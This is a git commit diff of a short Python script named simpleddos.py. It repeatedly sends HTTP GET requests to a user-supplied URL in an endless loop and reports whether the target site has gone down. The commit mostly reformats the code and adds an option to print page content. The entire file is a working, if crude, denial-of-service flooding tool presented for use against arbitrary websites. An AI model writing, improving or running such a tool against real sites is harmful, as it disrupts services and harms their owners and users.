422b2d7c739e6700bf8e9bc28355453581ca154e
watermelon46 <141306873+watermelon46@users.noreply.github.com>
2023-10-14 21:57:51 +0300

    Bugfix

--- simpleddos.py
+++ simpleddos.py
@@ -2,27 +2,29 @@ import requests
 codes = [100, 101, 102, 103, 200, 201, 202, 203, 204, 205, 206, 207, 208, 226, 300, 301, 302, 303, 304, 305, 306, 307, 308]
 def clear():
     print("\n"*100)
-counter=0
+counter = 0
 url = input("SimpleDDOS\nby holinim\nEnter site url (with https:// or http://):\n> ")
 showcontentraw = input("Show site content? [Y/N]\n> ")
-if showcontentraw=="Y" or showcontentraw=="y":
-    showcontent=True
+if showcontentraw == "Y" or showcontentraw == "y":
+    showcontent = True
 else:
-    showcontent=False
+    showcontent = False
 try:
     while True:        
-        counter+=1
+        counter += 1
         requests.get(url)
         requests.get(url)
         requests.get(url)
         r = requests.get(url)
         if r.status_code not in codes:
-            brick="true"
+            brick = "true"
         elif r.status_code==401:
-            brick="false, authorization is required"
+            brick = "false, authorization is required"
         else:
-            brick="false"
+            brick = "false"
         clear()
+        if showcontent:
+            print(r.content)
         print(f"Request pack #{counter}\nURL - {url}\nHTTP code - {r.status_code}\nIs brick - {brick}")
 except:
     print("You entered wrong URL or you don't have internet connection.")
